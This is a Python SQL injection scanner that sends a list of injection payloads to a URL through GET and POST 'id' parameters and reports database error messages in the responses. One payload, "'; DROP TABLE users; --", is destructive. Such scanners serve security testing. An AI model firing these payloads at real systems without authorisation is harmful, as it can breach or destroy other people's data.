import requests
from .utils import is_vulnerable
from requests.exceptions import RequestException

def scan(url, verbose=False):
    print(f"Scanning {url} for SQL Injection vulnerabilities...")
    
    # Expanded SQL Injection payloads
    payloads = [
        "'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", 
        "1 OR 1=1", "' OR ''='", "'; DROP TABLE users; --",
        "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*"
    ]
    
    # Test GET request
    for payload in payloads:
        try:
            test_url = f"{url}?id={payload}"
            if verbose:
                print(f"Testing with payload: {payload}")
            response = requests.get(test_url)
            
            if is_vulnerable(response):
                print(f"Potential SQL Injection vulnerability found with payload: {payload}")
                return
        except RequestException as e:
            print(f"Error during scanning: {e}")
            return
    
    # Test POST request (example with 'id' field)
    for payload in payloads:
        try:
            data = {'id': payload}
            if verbose:
                print(f"Testing POST with payload: {payload}")
            response = requests.post(url, data=data)
            
            if is_vulnerable(response):
                print(f"Potential SQL Injection vulnerability found with payload: {payload} in POST request")
                return
        except RequestException as e:
            print(f"Error during POST scanning: {e}")
            return
    
    print("No SQL Injection vulnerabilities detected.")

def is_vulnerable(response):
    error_messages = [
        "SQL syntax", "mysql_fetch_array()", "You have an error in your SQL syntax",
        "SQLite3::query()", "pg_query()", "ORA-01756"
    ]
    
    # Check for SQL error messages in the response
    if any(error in response.text for error in error_messages):
        return True
    
    # Additional checks (e.g., response length changes) could be added here
    return False
